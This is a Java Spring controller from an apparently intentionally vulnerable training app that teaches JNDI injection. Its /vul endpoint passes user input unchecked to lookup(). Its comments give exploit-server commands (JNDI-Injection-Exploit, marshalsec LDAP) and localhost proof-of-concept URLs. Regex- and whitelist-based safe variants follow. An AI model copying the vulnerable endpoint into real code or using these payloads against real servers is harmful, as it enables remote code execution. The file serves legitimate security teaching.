package com.madaha.codesecone.controller.jndi.RmiInject_Controller;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Arrays;
import java.util.List;

/**
 * JNDI注入攻击，其实就是相当于远程类加载，把远程的Class对象加载到本地执行，造成RCE。
 *
 * jndi注入可利用范围，注意：
 *    - JDK 6u132、7u122、8u113 开始 com.sun.jndi.rmi.object.trustURLCodebase 默认值为false，
 *    - 运行时需加入参数 -Dcom.sun.jndi.rmi.object.trustURLCodebase=true 。
 *    - 因为如果 JDK 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 RMI 代码。
 */
@RestController
@RequestMapping("/JNDI")
public class JNDIInject {
    Logger log = LoggerFactory.getLogger(JNDIInject.class);

    /**
     * lookup 方法会将传入的参数当做 JNDI 名称，如果参数值包含恶意的 JNDI 名称，那么攻击者就可以通过这种方式来执行任意的 JNDI 操作。
     * lookup：通过名字检索执行的对象，当lookup()方法的参数可控时，攻击者便能够提供一个恶意的url地址来加载恶意类。
     *
     * @payload-1 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open -a Calculator" -A 127.0.0.1
     * @payload-2 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:65500/\#Exploit
     *
     * @poc-ldap http://127.0.0.1:28888/JNDI/vul?content=ldap://127.0.0.1:1389/Object
     *
     * 注意：编写exp的时候，一定要注意不要带package！！！
     * @poc-rmi http://127.0.0.1:28888/JNDI/vul?content=rmi://127.0.0.1:1099/RCE
     *
     * 注意：默认注册时配置，ldap 1389端口，rmi 1099端口；
     * @param content
     * @return
     */
    @GetMapping("/vul")
    public String vul(String content){
        log.info("[vul] JNDI注入：" + content);

        try{
            Context ctx = new InitialContext();
            ctx.lookup(content);
        }catch (Exception e){
            log.warn("JNDI错误消息！");
            e.printStackTrace();
        }
        return "JNDI注入";
    }

    @GetMapping("/safe1")
    public String safe(String content){
        // 使用正则表达式限制参数的值。当且仅当，此字符串与给定的正则表达式匹配时 返回 true 。
        // 如果正则匹配时 仅仅 包含 “\w（匹配字母、数字、下划线。等价于 [A-Za-z0-9_]）” 、 “.” 、 "-" 时返回true； 包含次字符之外的字符时，返回false。
        if(content.matches("^[\\w\\.-]+$")){
            try{
                Context ctx = new InitialContext();
                ctx.lookup(content);
            }catch (Exception e){
                log.warn("JND错误信息");
            }

            // 执行完上述调用后，返回页面请求内容 用html编码后返回。
            return HtmlUtils.htmlEscape(content);
        }else{
            return "JNDI 正则拦截";
        }
    }

    /**
     * @poc http://127.0.0.1:28888/JNDI/safe2?content=rmi://127.0.0.1:1099/RCE
     *
     * @param content
     * @return
     */
    @GetMapping("/safe2")
    public String safe2(String content){
        // 白名单过滤，匹配放行。
        List<String> whiteList = Arrays.asList("java:comp/env/jdbc/mydb", "java:comp/env/mail/mymail");
        if (whiteList.contains(content)){
            try{
                Context ctx = new InitialContext();
                ctx.lookup(content);
            }catch (Exception e){
                log.warn("JNDI 错误消息");
            }

            // 执行完上述调用后，返回页面请求内容 用html编码后返回。
            return HtmlUtils.htmlEscape(content);
        }else {
            return "JNDI 白名单拦截";
        }
    }
}
